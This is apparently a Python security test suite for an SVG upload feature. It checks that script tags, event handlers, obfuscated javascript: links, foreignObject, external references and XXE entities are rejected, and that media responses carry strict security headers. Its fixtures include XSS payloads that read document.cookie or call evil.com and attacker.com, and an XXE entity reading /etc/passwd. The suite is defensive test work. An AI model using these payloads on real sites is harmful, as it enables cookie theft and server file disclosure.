#!/usr/bin/env python3
"""
tests/test_issue7_sc004_svg_isolation.py

Comprehensive security and regression test suite for Issue #7 (SC-004):
«Изоляция загрузок SVG и запрет исполнения активного содержимого в origin сайта».

Acceptance Criteria:
1. Исполнение активного JavaScript и XXE в загружаемых SVG полностью заблокировано:
   - Отклонение SVG с тегом <script> при декодировании, валидации и загрузке.
   - Отклонение SVG с обработчиками событий (onload, onerror, onclick и т.д.).
   - Отклонение SVG с опасными схемами (javascript:, vbscript:, data:text/html) и foreignObject.
   - Отклонение SVG с попытками внедрения внешних сущностей XML (XXE / external DTD / entity expansion).
2. Эндпоинт GET /media/<file> отдает Content-Security-Policy: default-src 'none'; style-src 'unsafe-inline',
   X-Content-Type-Options: nosniff и Content-Disposition: inline.
3. Легитимные векторные изображения SVG валидируются и декодируются корректно.
4. 100% тестов проходят успешно.
"""

import base64
import json
import os
import shutil
import tempfile
import threading
import unittest
import urllib.error
import urllib.request

import image_decoder
from image_decoder import ImageDecodeError, decode_and_validate_image
import server
from server import create_server, init_db, save_media_file, validate_cover_image
from tests.auth_helpers import upload_auth_headers

PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
FRONTEND_DIR = os.path.join(PROJECT_ROOT, "frontend", "public")


class TestIssue7SC004SVGIsolation(unittest.TestCase):
    """Target security test suite for Issue #7 (SC-004) SVG isolation."""

    @classmethod
    def setUpClass(cls):
        os.environ["SERVER_QUIET"] = "1"
        cls.temp_dir = tempfile.mkdtemp()
        cls.db_path = os.path.join(cls.temp_dir, "test_issue7_sc004.db")
        cls.media_dir = os.path.join(cls.temp_dir, "media")
        os.makedirs(cls.media_dir, exist_ok=True)
        server.DEFAULT_DB_PATH = cls.db_path
        server.MEDIA_DIR = cls.media_dir

        conn = init_db(cls.db_path)
        conn.close()

        cls.httpd = create_server(
            host="127.0.0.1",
            port=0,
            db_path=cls.db_path,
            directory=FRONTEND_DIR,
            media_dir=cls.media_dir
        )
        cls.port = cls.httpd.server_address[1]
        cls.server_thread = threading.Thread(target=cls.httpd.serve_forever, daemon=True)
        cls.server_thread.start()
        cls.base_url = f"http://127.0.0.1:{cls.port}"

    @classmethod
    def tearDownClass(cls):
        try:
            cls.httpd.shutdown()
            cls.httpd.server_close()
        except Exception:
            pass
        if os.path.exists(cls.temp_dir):
            shutil.rmtree(cls.temp_dir, ignore_errors=True)

    def _to_data_uri(self, svg_bytes: bytes) -> str:
        """Helper to create base64 SVG data URI."""
        b64 = base64.b64encode(svg_bytes).decode("ascii")
        return f"data:image/svg+xml;base64,{b64}"

    # -------------------------------------------------------------------------
    # 1. Отклонение SVG с тегом <script>
    # -------------------------------------------------------------------------
    def test_rejection_of_svg_with_script_tags(self):
        """1. Отклонение SVG с тегом <script>alert(1)</script> при декодировании и валидации."""
        script_payloads = [
            b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
            b'<svg xmlns="http://www.w3.org/2000/svg"><script type="text/javascript">alert(document.cookie);</script></svg>',
            b'<svg xmlns="http://www.w3.org/2000/svg"><script href="http://evil.com/xss.js"/></svg>',
            b'<svg xmlns="http://www.w3.org/2000/svg"><script><![CDATA[ alert(1); ]]></script></svg>',
            b'<svg xmlns="http://www.w3.org/2000/svg" xmlns:s="http://www.w3.org/2000/svg"><s:script>alert(1)</s:script></svg>',
            b'<svg xmlns="http://www.w3.org/2000/svg"><g><script>alert("nested")</script></g></svg>',
        ]

        for payload in script_payloads:
            with self.subTest(payload=payload[:50]):
                # Direct _decode_svg must raise ImageDecodeError
                with self.assertRaises(ImageDecodeError):
                    image_decoder._decode_svg(payload)

                # decode_and_validate_image must fail
                ok, err, meta = decode_and_validate_image(payload)
                self.assertFalse(ok, f"SVG with script should be rejected: {payload}")
                self.assertIsNotNone(err)
                self.assertIn("script", err.lower())

                # validate_cover_image via data URI must fail
                data_uri = self._to_data_uri(payload)
                cov_res = validate_cover_image(data_uri, target_media_dir=self.media_dir)
                self.assertFalse(cov_res.is_valid, f"Cover validation should reject SVG with script: {payload}")

                # POST /api/media/upload must return 400 Bad Request
                req = urllib.request.Request(
                    f"{self.base_url}/api/media/upload",
                    data=payload,
                    headers={**upload_auth_headers(self.db_path), "Content-Type": "image/svg+xml"},
                    method="POST"
                )
                with self.assertRaises(urllib.error.HTTPError) as ctx:
                    urllib.request.urlopen(req)
                self.assertEqual(ctx.exception.code, 400)

    # -------------------------------------------------------------------------
    # 2. Отклонение SVG с обработчиками событий (onload, onerror, onclick и т.д.)
    # -------------------------------------------------------------------------
    def test_rejection_of_svg_with_event_handlers(self):
        """2. Отклонение SVG с обработчиками событий (onload, onerror, onclick, onmouseover и др.)."""
        event_payloads = [
            b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><rect width="10" height="10"/></svg>',
            b'<svg xmlns="http://www.w3.org/2000/svg" ONLOAD="alert(1)"><circle r="5"/></svg>',
            b'<svg xmlns="http://www.w3.org/2000/svg"><circle cx="10" cy="10" r="5" onerror="alert(1)"/></svg>',
            b'<svg xmlns="http://www.w3.org/2000/svg"><path d="M0 0" onclick="alert(1)"/></svg>',
            b'<svg xmlns="http://www.w3.org/2000/svg"><rect width="10" height="10" onmouseover="alert(1)"/></svg>',
            b'<svg xmlns="http://www.w3.org/2000/svg"><text onfocus="alert(1)">Click</text></svg>',
            b'<svg xmlns="http://www.w3.org/2000/svg"><animate onbegin="alert(1)"/></svg>',
            b'<svg xmlns="http://www.w3.org/2000/svg"><set onend="alert(1)"/></svg>',
            b'<svg xmlns="http://www.w3.org/2000/svg"><animate attributeName="onload" values="alert(1)"/></svg>',
        ]

        for payload in event_payloads:
            with self.subTest(payload=payload[:50]):
                with self.assertRaises(ImageDecodeError):
                    image_decoder._decode_svg(payload)

                ok, err, meta = decode_and_validate_image(payload)
                self.assertFalse(ok, f"SVG with event handler should be rejected: {payload}")
                self.assertIsNotNone(err)

                data_uri = self._to_data_uri(payload)
                cov_res = validate_cover_image(data_uri, target_media_dir=self.media_dir)
                self.assertFalse(cov_res.is_valid, f"Cover validation should reject SVG with event handler: {payload}")

    # -------------------------------------------------------------------------
    # 3. Отклонение SVG с опасными схемами (javascript:) и foreignObject
    # -------------------------------------------------------------------------
    def test_rejection_of_dangerous_schemes_and_foreign_object(self):
        """3. Отклонение/блокировка SVG с опасными схемами (javascript:, vbscript:, data:text/html) и foreignObject."""
        dangerous_payloads = [
            b'<svg xmlns="http://www.w3.org/2000/svg"><a href="javascript:alert(1)"><text>Click</text></a></svg>',
            b'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><a xlink:href="javascript:alert(1)"><text>Click</text></a></svg>',
            b'<svg xmlns="http://www.w3.org/2000/svg"><image href="javascript:alert(1)"/></svg>',
            b'<svg xmlns="http://www.w3.org/2000/svg"><a href="  java\nscript:alert(1)"><text>Click</text></a></svg>',
            b'<svg xmlns="http://www.w3.org/2000/svg"><a href="java\\script:alert(1)"><text>Click</text></a></svg>',
            b'<svg xmlns="http://www.w3.org/2000/svg"><a href="jav&#x61;script:alert(1)"><text>Click</text></a></svg>',
            b'<svg xmlns="http://www.w3.org/2000/svg"><a href="%6a%61%76%61%73%63%72%69%70%74%3aalert(1)"><text>Click</text></a></svg>',
            b'<svg xmlns="http://www.w3.org/2000/svg"><a href="javascript&colon;alert(1)"><text>Click</text></a></svg>',
            b'<svg xmlns="http://www.w3.org/2000/svg"><a href="vbscript:msgbox(1)"><text>Click</text></a></svg>',
            b'<svg xmlns="http://www.w3.org/2000/svg"><image href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="/></svg>',
            b'<svg xmlns="http://www.w3.org/2000/svg"><image href="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4="/></svg>',
            b'<svg xmlns="http://www.w3.org/2000/svg"><foreignObject width="100" height="100"><div>Hello</div></foreignObject></svg>',
            b'<svg xmlns="http://www.w3.org/2000/svg"><foreignObject width="100" height="100"><iframe src="http://evil.com"></iframe></foreignObject></svg>',
            b'<svg xmlns="http://www.w3.org/2000/svg"><use href="http://evil.com/exploit.svg#icon"/></svg>',
            b'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><use xlink:href="//attacker.com/test.svg#id"/></svg>',
            b'<svg xmlns="http://www.w3.org/2000/svg"><use href="other_file.svg#id"/></svg>',
            b'<svg xmlns="http://www.w3.org/2000/svg"><style>@import url("http://evil.com/leak");</style></svg>',
            b'<svg xmlns="http://www.w3.org/2000/svg"><style>body { background: url(javascript:alert(1)); }</style></svg>',
        ]

        for payload in dangerous_payloads:
            with self.subTest(payload=payload[:50]):
                with self.assertRaises(ImageDecodeError):
                    image_decoder._decode_svg(payload)

                ok, err, meta = decode_and_validate_image(payload)
                self.assertFalse(ok, f"Dangerous SVG should be rejected: {payload}")
                self.assertIsNotNone(err)

                data_uri = self._to_data_uri(payload)
                cov_res = validate_cover_image(data_uri, target_media_dir=self.media_dir)
                self.assertFalse(cov_res.is_valid, f"Cover validation should reject dangerous SVG: {payload}")

    # -------------------------------------------------------------------------
    # 4. Отклонение попыток внедрения XML сущностей (XXE / external DTD / entity expansion)
    # -------------------------------------------------------------------------
    def test_rejection_of_xxe_and_entity_expansion(self):
        """4. Отклонение SVG с попытками внедрения внешних сущностей XML (XXE / external DTD / entity expansion)."""
        xxe_payloads = [
            b'<!DOCTYPE svg SYSTEM "http://evil.com/evil.dtd"><svg><rect width="10" height="10"/></svg>',
            b'<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><svg><text>&xxe;</text></svg>',
            b'<!DOCTYPE svg [ <!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;"> ]><svg><text>&lol2;</text></svg>',
            b'<!ENTITY % dtd SYSTEM "http://evil.com/xxe.dtd"><svg><rect width="10" height="10"/></svg>',
            b'<!DOCTYPE svg [ <!ELEMENT svg ANY> ]><svg><rect/></svg>',
            b'<!DOCTYPE svg [ <!ATTLIST svg id ID #IMPLIED> ]><svg><rect/></svg>',
            b'<svg xmlns="http://www.w3.org/2000/svg"><circle></svg>',  # Syntax error / malformed XML
        ]

        for payload in xxe_payloads:
            with self.subTest(payload=payload[:50]):
                with self.assertRaises(ImageDecodeError):
                    image_decoder._decode_svg(payload)

                ok, err, meta = decode_and_validate_image(payload)
                self.assertFalse(ok, f"XXE or malformed SVG should be rejected: {payload}")
                self.assertIsNotNone(err)

    # -------------------------------------------------------------------------
    # 5. Проверка корректного декодирования легитимных безопасных SVG
    # -------------------------------------------------------------------------
    def test_acceptance_and_decoding_of_legitimate_svgs(self):
        """5. Проверка корректного декодирования и пропуска легитимных безопасных SVG."""
        # 1. Valid 39:22 cover SVG
        svg_39_22 = (
            b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 780 440">'
            b'<rect width="780" height="440" fill="#2563eb"/>'
            b'<circle cx="390" cy="220" r="100" fill="#ffffff"/>'
            b'</svg>'
        )
        meta = image_decoder._decode_svg(svg_39_22)
        self.assertEqual(meta["format"], "svg")
        self.assertEqual(meta["mime"], "image/svg+xml")
        self.assertEqual(meta["width"], 780)
        self.assertEqual(meta["height"], 440)
        self.assertTrue(meta["is_static"])

        ok, err, meta_val = decode_and_validate_image(svg_39_22, require_aspect_ratio=True)
        self.assertTrue(ok, f"Legitimate 39:22 SVG should pass validation: {err}")
        self.assertIsNone(err)
        self.assertEqual(meta_val["width"], 780)
        self.assertEqual(meta_val["height"], 440)

        # 2. Valid SVG with XML declaration and safe styles
        svg_with_decl = (
            b'<?xml version="1.0" encoding="UTF-8"?>\n'
            b'<svg width="800" height="600" viewBox="0 0 800 600" xmlns="http://www.w3.org/2000/svg">\n'
            b'  <style>\n'
            b'    .cls-1 { fill: #3b82f6; stroke: #1d4ed8; }\n'
            b'    .text-title { font-family: sans-serif; font-size: 24px; }\n'
            b'  </style>\n'
            b'  <rect class="cls-1" x="10" y="10" width="780" height="580" rx="8"/>\n'
            b'  <text x="50" y="50" class="text-title">SmartContractum</text>\n'
            b'</svg>'
        )
        ok, err, meta_decl = decode_and_validate_image(svg_with_decl)
        self.assertTrue(ok, f"Legitimate SVG with declaration and CSS should pass: {err}")
        self.assertEqual(meta_decl["width"], 800)
        self.assertEqual(meta_decl["height"], 600)

        # 3. Valid SVG with internal local <use href="#id"/>
        svg_with_local_use = (
            b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">\n'
            b'  <defs>\n'
            b'    <g id="icon-star">\n'
            b'      <polygon points="50,5 64,36 98,36 70,57 81,91 50,70 19,91 30,57 2,36 36,36" fill="gold"/>\n'
            b'    </g>\n'
            b'  </defs>\n'
            b'  <use href="#icon-star" x="0" y="0"/>\n'
            b'</svg>'
        )
        ok, err, meta_use = decode_and_validate_image(svg_with_local_use)
        self.assertTrue(ok, f"Legitimate SVG with internal use reference should pass: {err}")
        self.assertEqual(meta_use["width"], 100)
        self.assertEqual(meta_use["height"], 100)

        # 4. Aspect ratio validation enforces 39:22 when required
        svg_bad_ratio = b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 600"><rect width="400" height="600"/></svg>'
        ok, err, meta_bad = decode_and_validate_image(svg_bad_ratio, require_aspect_ratio=True)
        self.assertFalse(ok)
        self.assertIn("39:22", err)

        # 5. Successful upload via POST /api/media/upload
        upload_req = urllib.request.Request(
            f"{self.base_url}/api/media/upload",
            data=json.dumps({"image": self._to_data_uri(svg_39_22)}).encode("utf-8"),
            headers={**upload_auth_headers(self.db_path), "Content-Type": "application/json"},
            method="POST"
        )
        with urllib.request.urlopen(upload_req) as resp:
            self.assertEqual(resp.status, 200)
            data = json.loads(resp.read().decode("utf-8"))
            self.assertTrue(data.get("success"))
            self.assertTrue(data["url"].startswith("/media/"))
            self.assertTrue(data["url"].endswith(".svg"))

    # -------------------------------------------------------------------------
    # 6. Проверка отдачи статики через GET /media/<file> с CSP, nosniff, inline
    # -------------------------------------------------------------------------
    def test_media_serve_security_headers(self):
        """6. Проверка отдачи статики через GET /media/<file>: наличие CSP, nosniff, inline."""
        # 1. Save legitimate SVG directly to media
        svg_content = (
            b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 780 440">'
            b'<rect width="780" height="440" fill="#10b981"/>'
            b'</svg>'
        )
        saved_url = save_media_file(svg_content, "svg", media_dir=self.media_dir)
        self.assertTrue(saved_url.startswith("/media/"))
        self.assertTrue(saved_url.endswith(".svg"))

        # Request served SVG
        media_req = urllib.request.Request(f"{self.base_url}{saved_url}")
        with urllib.request.urlopen(media_req) as resp:
            self.assertEqual(resp.status, 200)

            # Mandatory security headers
            csp = resp.headers.get("Content-Security-Policy")
            self.assertEqual(
                csp,
                "default-src 'none'; style-src 'unsafe-inline'",
                "GET /media/*.svg must send strict Content-Security-Policy"
            )

            nosniff = resp.headers.get("X-Content-Type-Options")
            self.assertEqual(
                nosniff,
                "nosniff",
                "GET /media/*.svg must send X-Content-Type-Options: nosniff"
            )

            disp = resp.headers.get("Content-Disposition")
            self.assertEqual(
                disp,
                "inline",
                "GET /media/*.svg must send Content-Disposition: inline"
            )

            # MIME and caching
            content_type = resp.headers.get("Content-Type")
            self.assertEqual(content_type, "image/svg+xml")

            cache_control = resp.headers.get("Cache-Control", "")
            self.assertIn("public", cache_control)
            self.assertIn("immutable", cache_control)

            # Content body integrity
            body = resp.read()
            self.assertEqual(body, svg_content)

        # 2. Also check that raster files (e.g. PNG) receive the security headers
        png_content = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15c4\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82"
        saved_png_url = save_media_file(png_content, "png", media_dir=self.media_dir)
        png_req = urllib.request.Request(f"{self.base_url}{saved_png_url}")
        with urllib.request.urlopen(png_req) as resp:
            self.assertEqual(resp.status, 200)
            self.assertEqual(resp.headers.get("Content-Security-Policy"), "default-src 'none'; style-src 'unsafe-inline'")
            self.assertEqual(resp.headers.get("X-Content-Type-Options"), "nosniff")
            self.assertEqual(resp.headers.get("Content-Disposition"), "inline")
            self.assertEqual(resp.headers.get("Content-Type"), "image/png")


if __name__ == "__main__":
    unittest.main()
